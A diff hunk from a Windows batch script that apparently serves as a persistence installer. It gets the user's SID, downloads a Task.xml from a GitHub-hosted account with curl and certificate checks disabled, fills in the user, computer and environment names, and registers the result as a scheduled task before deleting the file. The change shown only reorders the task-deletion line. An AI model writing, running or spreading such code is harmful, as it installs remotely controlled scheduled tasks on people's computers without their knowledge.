@@ -9,12 +9,12 @@ Set host=https://cryptedodissey.github.io
 Set enviroment=C:\Windows
 
 FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
-schtasks /Delete /TN "%SID%XYZ" /F
 curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
 powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
 powershell -Command "(gc '%SID%.xml') -replace 'environment', '%environment%' | Out-File -encoding ASCII '%SID%.xml'"
 powershell -Command "(gc '%SID%.xml') -replace 'computername', '%computername%' | Out-File -encoding ASCII '%SID%.xml'"
 powershell -Command "(gc '%SID%.xml') -replace 'username', '%username%' | Out-File -encoding ASCII '%SID%.xml'"
+schtasks /Delete /TN "%SID%XYZ" /F
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
 
